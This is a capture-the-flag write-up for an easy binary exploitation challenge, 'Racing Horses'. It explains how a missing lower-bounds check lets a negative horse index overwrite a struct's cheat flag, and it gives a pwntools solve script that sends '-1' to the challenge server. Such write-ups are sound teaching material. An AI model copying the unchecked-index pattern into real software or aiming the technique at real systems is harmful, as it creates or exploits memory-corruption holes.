# Racing Horses Writeup
## Author: Fabio, Luca - Albran, Feld
## Category: Binary Exploitation
## Difficulty: Easy

### Challenge Description
We cannot afford real horses, so we made a racing game with some virtual ones. If you bet on the right horse, you might win big! To make it easiear for you, your horse will always have a small head-start. Can you find out which one?  

The challenge is a simple racing horse game binary that allows the user to choose a horse to bet on. The game moves the horses randomly, but the user's horse is made weaker so that it will always lose. However, there is a hidden cheat feature that can be enabled to make the user's horse very fast and win.

The game `struct` is designed as follows:

```c
struct Game {
    int cheat;     
    struct Horse horses[10];
};
```
When the program ask for to choose a horse it simply check if the `choice` variable is greater than 9, but it does not perform lower bounds checks. It then writes 1 into the `position` field to give the player an head-start, but if the user pass a negative index, it will overwrite the `cheat` variable in the `Game` struct. This will garantee the win for the player.

### Solution

```python
from pwn import *

def get_process():
    if args.REMOTE:
        return remote('racing_horses.ctf.unipi.it', 5000)
    else:
        return remote('localhost', 5000)
    
p = get_process()
p.recvuntil(b'Your horse index (max 9): ', timeout=30)
p.sendline(b'-1')
p.recvuntil(b'FLAG: ', timeout=30)
flag = p.recvline().strip()
if "unipi{" in flag.decode():
    print(f"Flag found: {flag.decode()}")
    exit(0)
else:
    exit(1)

```
